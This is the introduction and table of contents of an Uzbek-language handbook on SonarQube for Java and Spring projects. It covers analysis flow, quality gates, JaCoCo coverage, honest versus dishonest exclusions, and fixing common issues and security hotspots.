# SonarQube: qanday ishlaydi va qanday kod bilan test undan o'tadi

Bu hujjat SonarQube ning ichki ishlashini va undan o'tadigan kod bilan testni
yozish yo'lini bir joyga yig'adi. Tayanch stek: Java, Spring va PostgreSQL.

Ogohlantirish: "har doim 100% o'tadigan" universal retsept yo'q. Quality gate
shartlari har loyihada boshqacha sozlanadi, va 100% coverage sifatni kafolatlamaydi.
Hujjat ikkalasini ham ko'rsatadi: shartni qanday qondirish, va qayerda bu raqam aldashi.

Hujjat to'rtlikning bir qismi. Dizayn patternlar `java-spring-design-patterns.md`
faylida, testlashning butun sohasi `java-spring-testing-handbook.md` faylida,
JVM, Spring va PostgreSQL mexanikasi `java-spring-architect-mindset.md` faylida.

## Mundarija


**[I. SonarQube qanday ishlaydi](#i-sonarqube-qanday-ishlaydi)**

- [1. SonarQube arxitekturasi va tahlil oqimi (Architecture and Analysis Flow)](#1-sonarqube-arxitekturasi-va-tahlil-oqimi-architecture-and-analysis-flow)
  - [1.1 SonarQube qismlari: server, web interfeys, compute engine, ma'lumotlar bazasi, scanner](#11-sonarqube-qismlari-server-web-interfeys-compute-engine-malumotlar-bazasi-scanner)
  - [1.2 SonarQube Server, SonarQube Cloud va IDE kengaytmasi o'rtasidagi farq](#12-sonarqube-server-sonarqube-cloud-va-ide-kengaytmasi-ortasidagi-farq)
  - [1.3 Tahlilning to'liq yo'li: scanner dan compute engine gacha](#13-tahlilning-toliq-yoli-scanner-dan-compute-engine-gacha)
  - [1.4 Scanner kodni qanday o'qiydi: sintaksis daraxti, semantik model, bytecode](#14-scanner-kodni-qanday-oqiydi-sintaksis-daraxti-semantik-model-bytecode)
  - [1.5 Nega kompilyatsiya qilingan klasslar kerak](#15-nega-kompilyatsiya-qilingan-klasslar-kerak)
  - [1.6 Natija qayerda saqlanadi va loyiha tarixi qanday to'planadi](#16-natija-qayerda-saqlanadi-va-loyiha-tarixi-qanday-toplanadi)
  - [1.7 Branch va pull request tahlili](#17-branch-va-pull-request-tahlili)
  - [1.8 Tahlil davomiyligi va uni qisqartirish](#18-tahlil-davomiyligi-va-uni-qisqartirish)
  - [1.9 Server versiyalari: LTA liniyasi va yangilanish siyosati](#19-server-versiyalari-lta-liniyasi-va-yangilanish-siyosati)
  - [1.10 Kechikish sabablari: tahlil tugadi, natija hali yo'q](#110-kechikish-sabablari-tahlil-tugadi-natija-hali-yoq)
  - [1.11 Amalda qo'llash](#111-amalda-qollash)
- [2. Scanner nimani yig'adi va qanday yuboradi (What the Scanner Collects)](#2-scanner-nimani-yigadi-va-qanday-yuboradi-what-the-scanner-collects)
  - [2.1 `sonar-project.properties` va asosiy parametrlar](#21-sonar-projectproperties-va-asosiy-parametrlar)
  - [2.2 Manba va test papkalarini to'g'ri ko'rsatish](#22-manba-va-test-papkalarini-togri-korsatish)
  - [2.3 `sonar.java.binaries` va `sonar.java.libraries`: nega majburiy](#23-sonarjavabinaries-va-sonarjavalibraries-nega-majburiy)
  - [2.4 Tashqi hisobotlarni ulash](#24-tashqi-hisobotlarni-ulash)
  - [2.5 Maven, Gradle va mustaqil scanner](#25-maven-gradle-va-mustaqil-scanner)
  - [2.6 Scanner qaysi fayllarni umuman ko'rmaydi](#26-scanner-qaysi-fayllarni-umuman-kormaydi)
  - [2.7 Tahlilni lokal tekshirish va ogohlantirishlarni o'qish](#27-tahlilni-lokal-tekshirish-va-ogohlantirishlarni-oqish)
  - [2.8 SCM ma'lumoti: blame nega kerak](#28-scm-malumoti-blame-nega-kerak)
  - [2.9 Monorepo va ko'p modulli loyiha](#29-monorepo-va-kop-modulli-loyiha)
  - [2.10 Scanner keshi, vaqt va takroriy tahlil](#210-scanner-keshi-vaqt-va-takroriy-tahlil)
  - [2.11 Amalda qo'llash](#211-amalda-qollash)
- [3. Issue turlari: bug, vulnerability, code smell, security hotspot (Issue Types)](#3-issue-turlari-bug-vulnerability-code-smell-security-hotspot-issue-types)
  - [3.1 Bug: ta'rifi, Sonar uni qanday aniqlaydi, Java dan misollar](#31-bug-tarifi-sonar-uni-qanday-aniqlaydi-java-dan-misollar)
  - [3.2 Vulnerability: xavfsizlik zaifligi va uning bug dan farqi](#32-vulnerability-xavfsizlik-zaifligi-va-uning-bug-dan-farqi)
  - [3.3 Code smell: saqlab turish qiyinligi, texnik qarzga qo'shiladigan vaqt](#33-code-smell-saqlab-turish-qiyinligi-texnik-qarzga-qoshiladigan-vaqt)
  - [3.4 Security hotspot: nega u avtomatik issue emas, balki qo'lda ko'rib chiqiladi](#34-security-hotspot-nega-u-avtomatik-issue-emas-balki-qolda-korib-chiqiladi)
  - [3.5 Hotspot holatlari: to review, acknowledged, fixed, safe](#35-hotspot-holatlari-to-review-acknowledged-fixed-safe)
  - [3.6 Yangi toifalash: dasturiy sifat atributlari va ta'sir darajalari (yangi versiyalarda)](#36-yangi-toifalash-dasturiy-sifat-atributlari-va-tasir-darajalari-yangi-versiyalarda)
  - [3.7 Severity darajalari va ular quality gate ga qanday ta'sir qiladi](#37-severity-darajalari-va-ular-quality-gate-ga-qanday-tasir-qiladi)
  - [3.8 Issue holati: open, confirmed, resolved, false positive, won't fix](#38-issue-holati-open-confirmed-resolved-false-positive-wont-fix)
  - [3.9 Issue ga oid qarorni kim qabul qiladi va uni qanday hujjatlashtirish](#39-issue-ga-oid-qarorni-kim-qabul-qiladi-va-uni-qanday-hujjatlashtirish)
  - [3.10 Bir xil muammoning bir nechta qoida bilan belgilanishi va uni tartibga solish](#310-bir-xil-muammoning-bir-nechta-qoida-bilan-belgilanishi-va-uni-tartibga-solish)
  - [3.11 Amalda qo'llash](#311-amalda-qollash)
- [4. Rule, quality profile va severity (Rules, Profiles and Severity)](#4-rule-quality-profile-va-severity-rules-profiles-and-severity)
  - [4.1 Qoida nima: tavsif, misol, tuzatish yo'li, kalit](#41-qoida-nima-tavsif-misol-tuzatish-yoli-kalit)
  - [4.2 Standart profil (Sonar way) va u nimani o'z ichiga oladi](#42-standart-profil-sonar-way-va-u-nimani-oz-ichiga-oladi)
  - [4.3 O'z profilingizni yaratish: nasl olish, qoida qo'shish va o'chirish](#43-oz-profilingizni-yaratish-nasl-olish-qoida-qoshish-va-ochirish)
  - [4.4 Qoidani o'chirish qachon to'g'ri qaror, qachon o'zini aldash](#44-qoidani-ochirish-qachon-togri-qaror-qachon-ozini-aldash)
  - [4.5 Qoida parametrlari: chegaralarni loyihaga moslash](#45-qoida-parametrlari-chegaralarni-loyihaga-moslash)
  - [4.6 Profil tayinlash: til bo'yicha, loyiha bo'yicha, tashkilot bo'yicha](#46-profil-tayinlash-til-boyicha-loyiha-boyicha-tashkilot-boyicha)
  - [4.7 Profil o'zgarishi va uning eski natijalarga ta'siri](#47-profil-ozgarishi-va-uning-eski-natijalarga-tasiri)
  - [4.8 Tashqi vositalar qoidalari: SpotBugs, PMD, Checkstyle bilan birga ishlash](#48-tashqi-vositalar-qoidalari-spotbugs-pmd-checkstyle-bilan-birga-ishlash)
  - [4.9 Qoidalar to'plamini jamoada kelishish va hujjatlashtirish](#49-qoidalar-toplamini-jamoada-kelishish-va-hujjatlashtirish)
  - [4.10 Profil versiyasini kuzatish va yangi qoidalar kelganda nima qilish](#410-profil-versiyasini-kuzatish-va-yangi-qoidalar-kelganda-nima-qilish)
  - [4.11 Amalda qo'llash](#411-amalda-qollash)
- [5. Metrikalar: rating, texnik qarz, murakkablik, takrorlanish (Metrics and Ratings)](#5-metrikalar-rating-texnik-qarz-murakkablik-takrorlanish-metrics-and-ratings)
  - [5.1 Reliability, security va maintainability reytinglari qanday hisoblanadi](#51-reliability-security-va-maintainability-reytinglari-qanday-hisoblanadi)
  - [5.2 Texnik qarz (technical debt) va debt ratio: formulasi va ma'nosi](#52-texnik-qarz-technical-debt-va-debt-ratio-formulasi-va-manosi)
  - [5.3 Remediation effort: har bir issue ga qo'yilgan vaqt bahosi qayerdan keladi](#53-remediation-effort-har-bir-issue-ga-qoyilgan-vaqt-bahosi-qayerdan-keladi)
  - [5.4 Cyclomatic complexity va cognitive complexity farqi](#54-cyclomatic-complexity-va-cognitive-complexity-farqi)
  - [5.5 Takrorlanish (duplication): blok qanday aniqlanadi va foiz qanday hisoblanadi](#55-takrorlanish-duplication-blok-qanday-aniqlanadi-va-foiz-qanday-hisoblanadi)
  - [5.6 Hajm metrikalari: qatorlar, bayonotlar, funksiyalar, klasslar](#56-hajm-metrikalari-qatorlar-bayonotlar-funksiyalar-klasslar)
  - [5.7 Qamrov metrikalari: line, branch va umumiy coverage](#57-qamrov-metrikalari-line-branch-va-umumiy-coverage)
  - [5.8 Metrikalarning cheklovi: raqam yaxshi, kod yomon bo'lishi mumkin](#58-metrikalarning-cheklovi-raqam-yaxshi-kod-yomon-bolishi-mumkin)
  - [5.9 Qaysi metrikaga ishonish mumkin, qaysi biri faqat signal](#59-qaysi-metrikaga-ishonish-mumkin-qaysi-biri-faqat-signal)
  - [5.10 Metrikani vaqt bo'ylab kuzatish va trend o'qish](#510-metrikani-vaqt-boylab-kuzatish-va-trend-oqish)
  - [5.11 Amalda qo'llash](#511-amalda-qollash)

**[II. Quality gate](#ii-quality-gate)**

- [6. Quality gate mexanikasi va shartlari (Quality Gate Mechanics)](#6-quality-gate-mexanikasi-va-shartlari-quality-gate-mechanics)
  - [6.1 Quality gate nima: shartlar to'plami va ularning tekshirilishi](#61-quality-gate-nima-shartlar-toplami-va-ularning-tekshirilishi)
  - [6.2 Standart gate va uning shartlari](#62-standart-gate-va-uning-shartlari)
  - [6.3 Shart tuzilishi: metrika, operator, chegara qiymati](#63-shart-tuzilishi-metrika-operator-chegara-qiymati)
  - [6.4 Gate holati: passed va failed, va u qachon hisoblanadi](#64-gate-holati-passed-va-failed-va-u-qachon-hisoblanadi)
  - [6.5 Gate ni loyihaga tayinlash va bir nechta gate ni boshqarish](#65-gate-ni-loyihaga-tayinlash-va-bir-nechta-gate-ni-boshqarish)
  - [6.6 Gate natijasini CI da olish: `sonar.qualitygate.wait` va uning ta'siri](#66-gate-natijasini-ci-da-olish-sonarqualitygatewait-va-uning-tasiri)
  - [6.7 Gate failed bo'lganda build ni to'xtatish yoki ogohlantirish bilan cheklanish](#67-gate-failed-bolganda-build-ni-toxtatish-yoki-ogohlantirish-bilan-cheklanish)
  - [6.8 Gate shartlarini tanlash mantiqi: nimani bloklash kerak, nimani kerak emas](#68-gate-shartlarini-tanlash-mantiqi-nimani-bloklash-kerak-nimani-kerak-emas)
  - [6.9 Juda qattiq gate ning ta'siri: chetlab o'tish yo'llari va jamoa xatti-harakati](#69-juda-qattiq-gate-ning-tasiri-chetlab-otish-yollari-va-jamoa-xatti-harakati)
  - [6.10 Gate o'zgarganda tarixiy loyihalarga ta'siri](#610-gate-ozgarganda-tarixiy-loyihalarga-tasiri)
  - [6.11 Amalda qo'llash](#611-amalda-qollash)
- [7. Yangi kod (new code) va "clean as you code" tamoyili (New Code and Clean as You Code)](#7-yangi-kod-new-code-va-clean-as-you-code-tamoyili-new-code-and-clean-as-you-code)
  - [7.1 Yangi kod nima: ta'rifi va u nega alohida o'lchanadi](#71-yangi-kod-nima-tarifi-va-u-nega-alohida-olchanadi)
  - [7.2 Yangi kod chegarasini belgilash usullari](#72-yangi-kod-chegarasini-belgilash-usullari)
  - [7.3 Qaysi usul qaysi reliz jarayoniga mos keladi](#73-qaysi-usul-qaysi-reliz-jarayoniga-mos-keladi)
  - [7.4 "Clean as you code" tamoyili: eski qarzni to'lamay turib oldinga siljish](#74-clean-as-you-code-tamoyili-eski-qarzni-tolamay-turib-oldinga-siljish)
  - [7.5 Yangi kod ustidagi shartlar va umumiy kod ustidagi shartlar farqi](#75-yangi-kod-ustidagi-shartlar-va-umumiy-kod-ustidagi-shartlar-farqi)
  - [7.6 Pull request tahlilida yangi kod qanday aniqlanadi](#76-pull-request-tahlilida-yangi-kod-qanday-aniqlanadi)
  - [7.7 Faylni ko'chirish, formatlash va refaktoring yangi kodni qanday shishiradi](#77-faylni-kochirish-formatlash-va-refaktoring-yangi-kodni-qanday-shishiradi)
  - [7.8 Blame ma'lumoti buzilganda nima bo'ladi va uni qanday tuzatish](#78-blame-malumoti-buzilganda-nima-boladi-va-uni-qanday-tuzatish)
  - [7.9 Yangi kodda 100% talab qilishning amaliy oqibatlari](#79-yangi-kodda-100-talab-qilishning-amaliy-oqibatlari)
  - [7.10 Eski kod reytingi va yangi kod reytingini bir vaqtda kuzatish](#710-eski-kod-reytingi-va-yangi-kod-reytingini-bir-vaqtda-kuzatish)
  - [7.11 Amalda qo'llash](#711-amalda-qollash)
- [8. 100% ga sozlangan gate: har bir shart nimani talab qiladi (A Gate Set to 100 Percent)](#8-100-ga-sozlangan-gate-har-bir-shart-nimani-talab-qiladi-a-gate-set-to-100-percent)
  - [8.1 "100% gate" aslida nimani anglatadi: bu bitta raqam emas, bir nechta shart](#81-100-gate-aslida-nimani-anglatadi-bu-bitta-raqam-emas-bir-nechta-shart)
  - [8.2 Shart: yangi kodda coverage 100 foiz, nimani talab qiladi va qanchaga tushadi](#82-shart-yangi-kodda-coverage-100-foiz-nimani-talab-qiladi-va-qanchaga-tushadi)
  - [8.3 Shart: yangi kodda takrorlanish 0 foiz, qanday qondiriladi](#83-shart-yangi-kodda-takrorlanish-0-foiz-qanday-qondiriladi)
  - [8.4 Shart: yangi issue 0 ta, har bir toifa bo'yicha nima qilish kerak](#84-shart-yangi-issue-0-ta-har-bir-toifa-boyicha-nima-qilish-kerak)
  - [8.5 Shart: security hotspot 100 foiz ko'rib chiqilgan, jarayoni](#85-shart-security-hotspot-100-foiz-korib-chiqilgan-jarayoni)
  - [8.6 Shart: reytinglar A darajada, nima buzadi](#86-shart-reytinglar-a-darajada-nima-buzadi)
  - [8.7 Shartlar birga qo'yilganda yuzaga keladigan qarama-qarshiliklar](#87-shartlar-birga-qoyilganda-yuzaga-keladigan-qarama-qarshiliklar)
  - [8.8 Gate ni qondirish uchun kerakli ish tartibi: aniq ketma-ketlik](#88-gate-ni-qondirish-uchun-kerakli-ish-tartibi-aniq-ketma-ketlik)
  - [8.9 foiz gate ning haqiqiy narxi: vaqt, jamoa charchog'i, chetlab o'tish xavfi](#89-foiz-gate-ning-haqiqiy-narxi-vaqt-jamoa-charchogi-chetlab-otish-xavfi)
  - [8.10 Qachon 100 foiz o'rinli, qachon 80-90 aqlliroq qaror](#810-qachon-100-foiz-orinli-qachon-80-90-aqlliroq-qaror)
  - [8.11 Gate ni bosqichma-bosqich qattiqlashtirish rejasi](#811-gate-ni-bosqichma-bosqich-qattiqlashtirish-rejasi)
  - [8.12 Amalda qo'llash](#812-amalda-qollash)

**[III. Qamrov (coverage)](#iii-qamrov-coverage)**

- [9. Coverage qanday o'lchanadi: JaCoCo mexanikasi (How Coverage Is Measured)](#9-coverage-qanday-olchanadi-jacoco-mexanikasi-how-coverage-is-measured)
  - [9.1 JaCoCo qanday ishlaydi: bytecode ga instrumentatsiya qo'shish](#91-jacoco-qanday-ishlaydi-bytecode-ga-instrumentatsiya-qoshish)
  - [9.2 Java agent va offline instrumentatsiya farqi](#92-java-agent-va-offline-instrumentatsiya-farqi)
  - [9.3 `jacoco.exec` fayli: nima yoziladi va qanday hisobotga aylanadi](#93-jacocoexec-fayli-nima-yoziladi-va-qanday-hisobotga-aylanadi)
  - [9.4 Instruction, line, branch, complexity va method qamrovi farqi](#94-instruction-line-branch-complexity-va-method-qamrovi-farqi)
  - [9.5 SonarQube qaysi ko'rsatkichni oladi va `coverage` qanday hisoblanadi](#95-sonarqube-qaysi-korsatkichni-oladi-va-coverage-qanday-hisoblanadi)
  - [9.6 Lambda, switch ifodasi va string konkatenatsiyasi bytecode da qanday ko'rinadi](#96-lambda-switch-ifodasi-va-string-konkatenatsiyasi-bytecode-da-qanday-korinadi)
  - [9.7 Bytecode dagi yashirin shartlar: nega qator yashil, lekin branch sariq](#97-bytecode-dagi-yashirin-shartlar-nega-qator-yashil-lekin-branch-sariq)
  - [9.8 Unit test va integratsion test qamrovini birlashtirish](#98-unit-test-va-integratsion-test-qamrovini-birlashtirish)
  - [9.9 Ko'p modulli loyihada umumiy hisobot yig'ish](#99-kop-modulli-loyihada-umumiy-hisobot-yigish)
  - [9.10 Qamrov o'lchovining chegarasi: bajarilgan kod tekshirilgan degani emas](#910-qamrov-olchovining-chegarasi-bajarilgan-kod-tekshirilgan-degani-emas)
  - [9.11 Amalda qo'llash](#911-amalda-qollash)
- [10. JaCoCo va SonarQube ulanishi: Maven va Gradle sozlash (Wiring JaCoCo to SonarQube)](#10-jacoco-va-sonarqube-ulanishi-maven-va-gradle-sozlash-wiring-jacoco-to-sonarqube)
  - [10.1 Maven da JaCoCo plugin: `prepare-agent` va `report` bosqichlari](#101-maven-da-jacoco-plugin-prepare-agent-va-report-bosqichlari)
  - [10.2 Hisobot yo'lini Sonar ga ko'rsatish: `sonar.coverage.jacoco.xmlReportPaths`](#102-hisobot-yolini-sonar-ga-korsatish-sonarcoveragejacocoxmlreportpaths)
  - [10.3 Nega XML hisobot kerak va binar `exec` fayl yetarli emas](#103-nega-xml-hisobot-kerak-va-binar-exec-fayl-yetarli-emas)
  - [10.4 Gradle da JaCoCo: `jacocoTestReport` va XML chiqishini yoqish](#104-gradle-da-jacoco-jacocotestreport-va-xml-chiqishini-yoqish)
  - [10.5 Ko'p modulli Maven loyihasida yig'ma hisobot tayyorlash](#105-kop-modulli-maven-loyihasida-yigma-hisobot-tayyorlash)
  - [10.6 Integratsion test qamrovini alohida yig'ib, keyin birlashtirish](#106-integratsion-test-qamrovini-alohida-yigib-keyin-birlashtirish)
  - [10.7 Surefire va Failsafe bilan ishlash tartibi](#107-surefire-va-failsafe-bilan-ishlash-tartibi)
  - [10.8 Coverage 0% ko'rinishi va uning sabablari](#108-coverage-0-korinishi-va-uning-sabablari)
  - [10.9 Sozlashni tekshirish: qaysi faylga qarash, qaysi log qatorini izlash](#109-sozlashni-tekshirish-qaysi-faylga-qarash-qaysi-log-qatorini-izlash)
  - [10.10 CI da tartib: test, hisobot, tahlil ketma-ketligi](#1010-ci-da-tartib-test-hisobot-tahlil-ketma-ketligi)
  - [10.11 Oddiy yondashuv va arxitektor yondashuvi](#1011-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [10.12 Amalda qo'llash](#1012-amalda-qollash)
- [11. Qamralmay qoladigan kod va unga test yozish (Code That Stays Uncovered)](#11-qamralmay-qoladigan-kod-va-unga-test-yozish-code-that-stays-uncovered)
  - [11.1 Private konstruktorli utility klass va unga test yozish](#111-private-konstruktorli-utility-klass-va-unga-test-yozish)
  - [11.2 `equals`, `hashCode`, `toString`: qamrash yoki record ga o'tish](#112-equals-hashcode-tostring-qamrash-yoki-record-ga-otish)
  - [11.3 Getter va setter: nega ular qamrovni suyultiradi](#113-getter-va-setter-nega-ular-qamrovni-suyultiradi)
  - [11.4 Istisno tarmoqlari: `catch` bloklarini qanday ishga tushirish](#114-istisno-tarmoqlari-catch-bloklarini-qanday-ishga-tushirish)
  - [11.5 Mudofaa tekshiruvlari (`if (x == null) throw`): ularni sinash yoki olib tashlash](#115-mudofaa-tekshiruvlari-if-x--null-throw-ularni-sinash-yoki-olib-tashlash)
  - [11.6 Konfiguratsiya klasslari va `@Bean` metodlari](#116-konfiguratsiya-klasslari-va-bean-metodlari)
  - [11.7 Mapper va konvertorlar: qo'lda yozilgani va generatsiya qilingani](#117-mapper-va-konvertorlar-qolda-yozilgani-va-generatsiya-qilingani)
  - [11.8 `main` metodi va Spring Boot ishga tushirish klassi](#118-main-metodi-va-spring-boot-ishga-tushirish-klassi)
  - [11.9 Yetib bo'lmaydigan kod: uni test bilan emas, o'chirish bilan hal qilish](#119-yetib-bolmaydigan-kod-uni-test-bilan-emas-ochirish-bilan-hal-qilish)
  - [11.10 Interfeys standart metodlari va abstrakt klasslar](#1110-interfeys-standart-metodlari-va-abstrakt-klasslar)
  - [11.11 Qamrash qiyin kodni qayta loyihalash: dizayn signali sifatida qarash](#1111-qamrash-qiyin-kodni-qayta-loyihalash-dizayn-signali-sifatida-qarash)
  - [11.12 Oddiy yondashuv va arxitektor yondashuvi](#1112-oddiy-yondashuv-va-arxitektor-yondashuvi)
  - [11.13 Tuzoq va yechim](#1113-tuzoq-va-yechim)
  - [11.14 Hisobotni tekshirish](#1114-hisobotni-tekshirish)
  - [11.15 Amalda qo'llash](#1115-amalda-qollash)
- [12. Exclusion: nimani chiqarish halol, nimani chiqarish aldov (Exclusions, Honest and Dishonest)](#12-exclusion-nimani-chiqarish-halol-nimani-chiqarish-aldov-exclusions-honest-and-dishonest)
  - [12.1 Exclusion turlari: tahlildan, qamrovdan, takrorlanishdan, muayyan qoidadan](#121-exclusion-turlari-tahlildan-qamrovdan-takrorlanishdan-muayyan-qoidadan)
  - [12.2 `sonar.exclusions`, `sonar.coverage.exclusions`, `sonar.cpd.exclusions` farqi](#122-sonarexclusions-sonarcoverageexclusions-sonarcpdexclusions-farqi)
  - [12.3 Generatsiya qilingan kodni chiqarish: nega bu halol qaror](#123-generatsiya-qilingan-kodni-chiqarish-nega-bu-halol-qaror)
  - [12.4 DTO, entity va konfiguratsiya klasslarini chiqarish: qachon o'rinli](#124-dto-entity-va-konfiguratsiya-klasslarini-chiqarish-qachon-orinli)
  - [12.5 Migratsiya skriptlari va qolip (template) fayllari](#125-migratsiya-skriptlari-va-qolip-template-fayllari)
  - [12.6 `@Generated` annotatsiyasi va JaCoCo ning unga munosabati](#126-generated-annotatsiyasi-va-jacoco-ning-unga-munosabati)
  - [12.7 Kod ichida bostirish: `@SuppressWarnings` va Sonar ning maxsus izohi](#127-kod-ichida-bostirish-suppresswarnings-va-sonar-ning-maxsus-izohi)
  - [12.8 Bostirishni majburan asoslash: izoh talab qilish qoidasi](#128-bostirishni-majburan-asoslash-izoh-talab-qilish-qoidasi)
  - [12.9 Aldov belgilari: butun paketni chiqarish, murakkab klassni chiqarish](#129-aldov-belgilari-butun-paketni-chiqarish-murakkab-klassni-chiqarish)
  - [12.10 Exclusion ro'yxatini ko'rib chiqish tartibi va uni kim tasdiqlaydi](#1210-exclusion-royxatini-korib-chiqish-tartibi-va-uni-kim-tasdiqlaydi)
  - [12.11 Exclusion siyosatini hujjatlashtirish namunasi](#1211-exclusion-siyosatini-hujjatlashtirish-namunasi)
  - [12.12 Amalda qo'llash](#1212-amalda-qollash)

**[IV. Sonar o'tadigan kod](#iv-sonar-otadigan-kod)**

- [13. Sonar o'tadigan kod yozish qoidalari (Writing Code That Passes)](#13-sonar-otadigan-kod-yozish-qoidalari-writing-code-that-passes)
  - [13.1 Metodni qisqa va bitta mas'uliyatli qilish: murakkablik chegarasidan oshmaslik](#131-metodni-qisqa-va-bitta-masuliyatli-qilish-murakkablik-chegarasidan-oshmaslik)
  - [13.2 Parametrlar soni va ularni obyektga yig'ish](#132-parametrlar-soni-va-ularni-obyektga-yigish)
  - [13.3 Ichma-ich shartlarni erta qaytish bilan yassilash](#133-ichma-ich-shartlarni-erta-qaytish-bilan-yassilash)
  - [13.4 `null` ni qaytarmaslik va `Optional` ni to'g'ri ishlatish](#134-null-ni-qaytarmaslik-va-optional-ni-togri-ishlatish)
  - [13.5 Istisnolarni to'g'ri ushlash: umumiy `Exception` ni ushlamaslik, yutib yubormaslik](#135-istisnolarni-togri-ushlash-umumiy-exception-ni-ushlamaslik-yutib-yubormaslik)
  - [13.6 Resurslarni yopish: `try-with-resources` va yopilmagan oqim](#136-resurslarni-yopish-try-with-resources-va-yopilmagan-oqim)
  - [13.7 O'zgaruvchan holatni cheklash: `final`, immutable obyekt](#137-ozgaruvchan-holatni-cheklash-final-immutable-obyekt)
  - [13.8 Takrorlanuvchi literal va magic number ni konstantaga chiqarish](#138-takrorlanuvchi-literal-va-magic-number-ni-konstantaga-chiqarish)
  - [13.9 To'g'ri taqqoslash: `equals`, `compareTo`, suzuvchi nuqta, `BigDecimal`](#139-togri-taqqoslash-equals-compareto-suzuvchi-nuqta-bigdecimal)
  - [13.10 Loglash qoidalari: formatlangan xabar, istisno uzatish, maxfiy ma'lumot](#1310-loglash-qoidalari-formatlangan-xabar-istisno-uzatish-maxfiy-malumot)
  - [13.11 Kodni Sonar nuqtai nazaridan o'qib chiqish odati](#1311-kodni-sonar-nuqtai-nazaridan-oqib-chiqish-odati)
  - [13.12 Amalda qo'llash](#1312-amalda-qollash)
- [14. Java va Spring da eng ko'p uchraydigan issue va ularning yechimi (Common Java and Spring Issues)](#14-java-va-spring-da-eng-kop-uchraydigan-issue-va-ularning-yechimi-common-java-and-spring-issues)
  - [14.1 Maydon orqali bog'liqlik kiritish (`@Autowired` field injection) va konstruktor bilan almashtirish](#141-maydon-orqali-bogliqlik-kiritish-autowired-field-injection-va-konstruktor-bilan-almashtirish)
  - [14.2 Katta controller metodi va uni servisga bo'lish](#142-katta-controller-metodi-va-uni-servisga-bolish)
  - [14.3 Tekshirilmagan foydalanuvchi kiritmasi va validatsiya](#143-tekshirilmagan-foydalanuvchi-kiritmasi-va-validatsiya)
  - [14.4 Qo'lda yozilgan SQL konkatenatsiyasi va parametrlangan so'rov](#144-qolda-yozilgan-sql-konkatenatsiyasi-va-parametrlangan-sorov)
  - [14.5 `@Transactional` ni noto'g'ri joyga qo'yish bilan bog'liq ogohlantirishlar](#145-transactional-ni-notogri-joyga-qoyish-bilan-bogliq-ogohlantirishlar)
  - [14.6 Sana va vaqt bilan ishlash: eskirgan API va `java.time`](#146-sana-va-vaqt-bilan-ishlash-eskirgan-api-va-javatime)
  - [14.7 To'plamlarni qaytarish: modifikatsiya qilinadigan ichki to'plamni chiqarib yuborish](#147-toplamlarni-qaytarish-modifikatsiya-qilinadigan-ichki-toplamni-chiqarib-yuborish)
  - [14.8 Strim va sikl ichida og'ir operatsiya](#148-strim-va-sikl-ichida-ogir-operatsiya)
  - [14.9 Thread va `ExecutorService` bilan bog'liq ogohlantirishlar](#149-thread-va-executorservice-bilan-bogliq-ogohlantirishlar)
  - [14.10 Eskirgan (deprecated) API ishlatish va migratsiya](#1410-eskirgan-deprecated-api-ishlatish-va-migratsiya)
  - [14.11 Test kodidagi tez-tez uchraydigan issue lar](#1411-test-kodidagi-tez-tez-uchraydigan-issue-lar)
  - [14.12 Issue larni toifa bo'yicha tartiblash va birinchi nimani tuzatish](#1412-issue-larni-toifa-boyicha-tartiblash-va-birinchi-nimani-tuzatish)
  - [14.13 Amalda qo'llash](#1413-amalda-qollash)
- [15. Cognitive complexity va takrorlanishni kamaytirish (Cognitive Complexity and Duplication)](#15-cognitive-complexity-va-takrorlanishni-kamaytirish-cognitive-complexity-and-duplication)
  - [15.1 Cognitive complexity qanday hisoblanadi: ortish va chuqurlik jarimasi](#151-cognitive-complexity-qanday-hisoblanadi-ortish-va-chuqurlik-jarimasi)
  - [15.2 Cyclomatic complexity bilan farqi va nega Sonar ikkinchisini afzal ko'radi](#152-cyclomatic-complexity-bilan-farqi-va-nega-sonar-ikkinchisini-afzal-koradi)
  - [15.3 Chegaradan oshgan metodni bo'lish usullari](#153-chegaradan-oshgan-metodni-bolish-usullari)
  - [15.4 Shartlar daraxtini jadval yoki xaritaga aylantirish](#154-shartlar-daraxtini-jadval-yoki-xaritaga-aylantirish)
  - [15.5 Qo'riqchi shart (guard clause) bilan chuqurlikni kamaytirish](#155-qoriqchi-shart-guard-clause-bilan-chuqurlikni-kamaytirish)
  - [15.6 Strategiya tanlovini `switch` dan ko'rsatkichga ko'chirish](#156-strategiya-tanlovini-switch-dan-korsatkichga-kochirish)
  - [15.7 Takrorlanish qanday aniqlanadi: token ketma-ketligi va eng kichik blok](#157-takrorlanish-qanday-aniqlanadi-token-ketma-ketligi-va-eng-kichik-blok)
  - [15.8 Yolg'on takrorlanish: o'xshash, lekin boshqa sababga xizmat qiladigan kod](#158-yolgon-takrorlanish-oxshash-lekin-boshqa-sababga-xizmat-qiladigan-kod)
  - [15.9 Takrorlanishni umumiy metodga chiqarish va qachon chiqarmaslik](#159-takrorlanishni-umumiy-metodga-chiqarish-va-qachon-chiqarmaslik)
  - [15.10 Test kodidagi takrorlanish: alohida munosabat talab qiladi](#1510-test-kodidagi-takrorlanish-alohida-munosabat-talab-qiladi)
  - [15.11 Murakkablikni o'lchash va uni kamaytirishni rejaga qo'yish](#1511-murakkablikni-olchash-va-uni-kamaytirishni-rejaga-qoyish)
  - [15.12 Amalda qo'llash](#1512-amalda-qollash)
- [16. Security hotspot va vulnerability: tekshirish va tuzatish (Security Hotspots and Vulnerabilities)](#16-security-hotspot-va-vulnerability-tekshirish-va-tuzatish-security-hotspots-and-vulnerabilities)
  - [16.1 Hotspot va vulnerability farqi: biri ko'rib chiqishni, biri tuzatishni talab qiladi](#161-hotspot-va-vulnerability-farqi-biri-korib-chiqishni-biri-tuzatishni-talab-qiladi)
  - [16.2 Hotspot ni ko'rib chiqish jarayoni: kim, qanday, qanday asos bilan](#162-hotspot-ni-korib-chiqish-jarayoni-kim-qanday-qanday-asos-bilan)
  - [16.3 SQL in'ektsiya: zaif kod va parametrlangan so'rov bilan tuzatish](#163-sql-inektsiya-zaif-kod-va-parametrlangan-sorov-bilan-tuzatish)
  - [16.4 Komanda bajarish va yo'l bilan ishlashdagi xavflar](#164-komanda-bajarish-va-yol-bilan-ishlashdagi-xavflar)
  - [16.5 Maxfiy ma'lumot kodda: kalit, parol, token va ularni tashqariga chiqarish](#165-maxfiy-malumot-kodda-kalit-parol-token-va-ularni-tashqariga-chiqarish)
  - [16.6 Kriptografiya: zaif algoritm, tasodifiy son manbasi, qattiq yozilgan kalit](#166-kriptografiya-zaif-algoritm-tasodifiy-son-manbasi-qattiq-yozilgan-kalit)
